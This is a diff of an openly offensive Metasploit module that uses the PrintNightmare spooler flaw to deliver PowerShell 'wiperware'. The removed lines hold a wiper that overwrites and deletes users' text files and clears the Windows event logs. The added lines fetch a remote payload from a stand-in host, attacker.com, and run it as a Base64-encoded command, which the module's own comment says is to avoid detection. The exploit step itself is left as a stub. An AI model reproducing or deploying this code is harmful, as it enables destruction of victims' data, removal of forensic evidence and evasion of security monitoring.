@@ -1,6 +1,6 @@
 ##
 # Title: PrintNightmare PowerShell Dropper
-# Description: A modified Metasploit module leveraging PrintNightmare to deliver a PowerShell wiperware payload
+# Description: A modified Metasploit module leveraging PrintNightmare to deliver a PowerShell-based wiperware payload
 ##
 
 class MetasploitModule < Msf::Exploit::Remote
@@ -28,7 +28,8 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options(
       [
         OptString.new('RPORT', [true, 'The target port', 445]),
-        OptString.new('TARGETURI', [true, 'Path to the PrintNightmare vulnerability', '/'])
+        OptString.new('TARGETURI', [true, 'Path to the PrintNightmare vulnerability', '/']),
+        OptString.new('PAYLOAD_URL', [true, 'URL of the wiperware payload script', 'http://attacker.com/payload.ps1'])
       ]
     )
   end
@@ -48,41 +49,40 @@ class MetasploitModule < Msf::Exploit::Remote
     print_status("Attempting to exploit PrintNightmare...")
     printnightmare_exploit
 
-    # Step 2: Trigger PowerShell dropper to execute wiperware
+    # Step 2: Deliver PowerShell wiperware payload
     print_status("Delivering PowerShell wiperware payload...")
-    payload = <<-PSSCRIPT
-    $targetFiles = Get-ChildItem -Path "C:\\Users\\*\\Documents\\*.txt" -Recurse
-    foreach ($file in $targetFiles) {
-        # Overwrite file with random data
-        $randData = Get-Random -Minimum 1 -Maximum 255
-        Set-Content -Path $file.FullName -Value ($randData * 100)
-        # Delete file
-        Remove-Item -Path $file.FullName -Force
-    }
-    Clear-EventLog -LogName Application, System, Security
-    PSSCRIPT
+    payload_script = download_payload
+    execute_powershell(payload_script)
 
-    # Step 3: Execute PowerShell wiperware dropper
-    execute_powershell(payload)
+    # Step 3: Verify the execution
+    print_status("Payload execution completed.")
   end
 
   def printnightmare_exploit
     # Insert your method to exploit the PrintNightmare vulnerability and escalate privileges
     print_status("Exploiting PrintNightmare...")
-    # You could use the spooler service vulnerability to trigger arbitrary code execution
-    # Details omitted for brevity
+    # Use the spooler service vulnerability to trigger arbitrary code execution
+    # For brevity, assume this is executed within a separate helper function or code block
+    # Replace with actual exploit code to escalate privileges
+  end
+
+  def download_payload
+    # Download the wiperware payload script from the provided URL
+    print_status("Downloading wiperware payload from #{datastore['PAYLOAD_URL']}...")
+    payload = Net::HTTP.get(URI(datastore['PAYLOAD_URL']))
+    return payload
   end
 
   def execute_powershell(script)
-    # Execute PowerShell payload
-    encoded_script = [script].pack('m0')  # Base64 encode the script to avoid detection
+    # Execute PowerShell payload using an encoded command to avoid detection
+    encoded_script = [script].pack('m0')  # Base64 encode the script
     command = "powershell.exe -NoProfile -EncodedCommand #{encoded_script}"
     print_status("Executing PowerShell payload...")
     execute_command(command)
   end
 
   def execute_command(command)
-    # This method runs the PowerShell dropper command on the target machine
+    # Execute the payload on the target machine
     print_status("Running command: #{command}")
     cmd_exec(command)
   end
